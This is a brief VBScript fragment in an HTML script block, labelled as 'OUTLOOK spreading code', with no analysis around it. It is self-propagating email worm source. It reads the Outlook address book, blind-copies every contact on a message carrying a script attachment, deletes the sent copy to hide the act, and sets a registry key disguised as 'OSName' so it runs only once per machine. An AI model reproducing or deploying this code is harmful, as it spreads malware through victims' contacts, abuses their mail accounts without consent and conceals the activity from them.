'OUTLOOK spreading code (will be run only once in each computer since it uses the registry to remember if it was run).
<SCRIPT LANGUAGE = "VBScript"><!--
HG = ""
Set R = CreateObject("WScript.Shell")
HG = R.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\OSName")
If HG = "" Then
  D = ""
  Set D = CreateObject("Outlook.Application")
  If D <> "" Then
    Set JS = D.GetNameSpace("MAPI")
    M = False
    For Each G In JS.AddressLists
      If G.AddressEntries.Count > 0 Then
        Set U = D.CreateItem(0)
        For VH = 1 To G.AddressEntries.Count
          Set FP = G.AddressEntries(VH)
          If VH = 1 Then
            U.BCC = FP.Address
          Else
            U.BCC = U.BCC & "; " & FP.Address
          End If
        Next
        U.Subject = "Email subject."
        U.Body = "Email body."
        U.Attachments.Add "C:\TEST.VBS" 'File path.
        U.DeleteAfterSubmit = True
        U.Send
        M = True
      End If
    Next
    If M = True Then
      R.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\OSName","Microsoft Windows"
    End If
  End If
End If

//--></SCRIPT>